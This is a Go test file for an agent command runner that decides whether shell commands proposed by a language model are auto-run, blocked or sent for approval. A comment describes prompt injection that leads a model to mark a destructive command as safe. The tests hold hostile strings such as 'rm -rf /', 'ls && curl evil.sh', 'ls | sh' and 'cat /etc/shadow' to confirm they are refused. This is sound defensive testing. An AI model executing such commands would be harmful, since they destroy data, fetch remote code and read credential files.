package agentos

import (
	"context"
	"fmt"
	"os"
	"strings"
	"testing"
	"time"
)

// TestSafeFieldNeverAuthorizes is the security-critical test for this package.
// The "safe" number is written by the model, and a model whose context holds
// attacker-influenced text (a fetched page, a file, a tool result) can be made
// to claim anything. If this test ever fails, prompt injection has become
// privilege escalation.
func TestSafeFieldNeverAuthorizes(t *testing.T) {
	hostile := Proposal{Cmd: "rm -rf /", Dsc: "routine cleanup, completely safe", Safe: 2}

	for _, tc := range []struct {
		policy  Policy
		allowed []string
		wantRun bool
	}{
		{policy: PolicyDeny, wantRun: false},
		{policy: PolicyWhitelist, allowed: []string{"ls", "cat"}, wantRun: false},
	} {
		r := Runner{Policy: tc.policy, Allowed: tc.allowed}
		if got := r.Evaluate(hostile); got.AutoRun != tc.wantRun {
			t.Fatalf("policy %s auto-ran a self-declared-safe destructive command: %+v", tc.policy, got)
		}
		// And the same command with the least reassuring self-assessment must
		// reach exactly the same decision: safe is not an input at all.
		timid := hostile
		timid.Safe = 0
		if r.Evaluate(timid) != r.Evaluate(hostile) {
			t.Fatalf("policy %s changed its decision based on the safe field", tc.policy)
		}
	}
}

func TestDenyPolicyIsTheZeroValue(t *testing.T) {
	var r Runner // deliberately unconfigured
	if d := r.Evaluate(Proposal{Cmd: "ls"}); d.AutoRun {
		t.Fatalf("an unconfigured Runner auto-ran a command: %+v", d)
	}
	if p, err := ParsePolicy(""); err != nil || p != PolicyDeny {
		t.Fatalf("empty policy = %q, %v; want deny", p, err)
	}
}

// A whitelist that matched substrings or only argv[0] verbatim would let
// "ls; rm -rf /" through on an "ls" entry.
func TestWhitelistRefusesChaining(t *testing.T) {
	r := Runner{Policy: PolicyWhitelist, Allowed: []string{"ls", "git"}}
	for _, cmd := range []string{
		"ls; rm -rf /",
		"ls && curl evil.sh",
		"ls | sh",
		"ls > /etc/passwd",
		"ls $(whoami)",
		"ls `id`",
		"ls\nrm -rf /",
		"cat /etc/shadow",
	} {
		d := r.Evaluate(Proposal{Cmd: cmd, Safe: 2})
		if d.AutoRun {
			t.Errorf("whitelist auto-ran %q: %+v", cmd, d)
		}
	}
}

func TestWhitelistAllowsPlainAllowlistedProgram(t *testing.T) {
	r := Runner{Policy: PolicyWhitelist, Allowed: []string{"ls", "git"}}
	for _, cmd := range []string{"ls -al /tmp", "/bin/ls -al", "git status"} {
		if d := r.Evaluate(Proposal{Cmd: cmd}); !d.AutoRun {
			t.Errorf("whitelist blocked allow-listed %q: %+v", cmd, d)
		}
	}
}

// A path is matched by its base name, so /usr/bin/ls counts as "ls" — but a
// program that merely *contains* an allow-listed name must not.
func TestWhitelistMatchesProgramNameNotSubstring(t *testing.T) {
	r := Runner{Policy: PolicyWhitelist, Allowed: []string{"ls"}}
	for _, cmd := range []string{"lsof", "false-ls", "lsblk"} {
		if d := r.Evaluate(Proposal{Cmd: cmd}); d.AutoRun {
			t.Errorf("whitelist auto-ran %q on an 'ls' entry: %+v", cmd, d)
		}
	}
}

func TestSplitArgsHonorsQuotes(t *testing.T) {
	args, err := SplitArgs(`git commit -m "a message" --author 'Me'`)
	if err != nil {
		t.Fatal(err)
	}
	want := []string{"git", "commit", "-m", "a message", "--author", "Me"}
	if strings.Join(args, "|") != strings.Join(want, "|") {
		t.Fatalf("args = %q, want %q", args, want)
	}
	if _, err := SplitArgs(`echo "unterminated`); err == nil {
		t.Fatal("unterminated quote must be an error, not a guess")
	}
}

func TestParseProposalToleratesFencesAndProse(t *testing.T) {
	for _, raw := range []string{
		`{"cmd":"ls -al /","dsc":"list root","safe":2}`,
		"```json\n{\"cmd\":\"ls -al /\",\"dsc\":\"list root\",\"safe\":2}\n```",
		"Sure!\n{\"cmd\":\"ls -al /\",\"dsc\":\"list root\",\"safe\":2}\nHope that helps.",
	} {
		p, err := ParseProposal(raw)
		if err != nil {
			t.Fatalf("ParseProposal(%q): %v", raw, err)
		}
		if p.Cmd != "ls -al /" || p.Safe != 2 || p.Dsc != "list root" {
			t.Fatalf("parsed = %+v", p)
		}
	}
	if _, err := ParseProposal("I cannot do that"); err == nil {
		t.Fatal("prose without JSON must be an error")
	}
	if _, err := ParseProposal(`{"dsc":"nothing","safe":2}`); err == nil {
		t.Fatal("a proposal without cmd must be an error")
	}
}

func TestExecuteRequiresApprovalUnderDeny(t *testing.T) {
	r := Runner{Policy: PolicyDeny}
	if _, _, err := r.Execute(context.Background(), Proposal{Cmd: "echo hi", Safe: 2}, false); err == nil {
		t.Fatal("deny mode ran a command without approval")
	}
	res, _, err := r.Execute(context.Background(), Proposal{Cmd: "echo hi"}, true)
	if err != nil {
		t.Fatalf("approved command failed: %v", err)
	}
	if !strings.Contains(res.Output, "hi") {
		t.Fatalf("output = %q", res.Output)
	}
}

// Even a human clicking approve must not turn a blocked proposal into a run:
// whitelist mode refuses chaining outright rather than asking.
func TestApprovalCannotUnblockAChainedCommand(t *testing.T) {
	r := Runner{Policy: PolicyWhitelist, Allowed: []string{"echo"}}
	if _, d, err := r.Execute(context.Background(), Proposal{Cmd: "echo hi; echo bye"}, true); err == nil {
		t.Fatalf("approval overrode a blocked proposal: %+v", d)
	}
}

// Without a shell, metacharacters are inert text rather than syntax.
func TestNonAllowPolicyDoesNotUseAShell(t *testing.T) {
	r := Runner{Policy: PolicyDeny}
	res, _, err := r.Execute(context.Background(), Proposal{Cmd: `echo $HOME`}, true)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(res.Output, "$HOME") {
		t.Fatalf("deny-mode execution expanded a shell variable; output = %q", res.Output)
	}
}

func TestExecuteTimesOutAndCapsOutput(t *testing.T) {
	t.Setenv("GO_WANT_AGENTOS_HELPER_PROCESS", "1")
	helper := `"` + os.Args[0] + `" -test.run=^TestExecuteHelperProcess$ -- `

	r := Runner{Policy: PolicyDeny, Timeout: 250 * time.Millisecond}
	res, _, err := r.Execute(context.Background(), Proposal{Cmd: helper + "sleep"}, true)
	if err != nil && !res.TimedOut {
		t.Fatalf("unexpected error: %v", err)
	}
	if !res.TimedOut {
		t.Fatal("long command did not report a timeout")
	}

	capped := Runner{Policy: PolicyDeny, MaxOutput: 64}
	out, _, err := capped.Execute(context.Background(), Proposal{Cmd: helper + "output"}, true)
	if err != nil {
		t.Fatal(err)
	}
	if !out.Truncated || len(out.Output) > 64 {
		t.Fatalf("output cap not applied: truncated=%v len=%d", out.Truncated, len(out.Output))
	}
}

func TestExecuteHelperProcess(t *testing.T) {
	if os.Getenv("GO_WANT_AGENTOS_HELPER_PROCESS") != "1" {
		return
	}
	switch os.Args[len(os.Args)-1] {
	case "sleep":
		time.Sleep(5 * time.Second)
	case "output":
		fmt.Print(strings.Repeat("x", 500))
	default:
		os.Exit(2)
	}
	os.Exit(0)
}

func TestAllowPolicyUsesNativeShell(t *testing.T) {
	r := Runner{Policy: PolicyAllow}
	res, _, err := r.Execute(context.Background(), Proposal{Cmd: "echo shell-ok"}, false)
	if err != nil {
		t.Fatalf("native shell command failed: %v", err)
	}
	if !strings.Contains(res.Output, "shell-ok") {
		t.Fatalf("native shell output = %q", res.Output)
	}
}

func TestParsePolicyRejectsUnknown(t *testing.T) {
	if _, err := ParsePolicy("yolo"); err == nil {
		t.Fatal("unknown policy must be rejected rather than silently downgraded")
	}
}
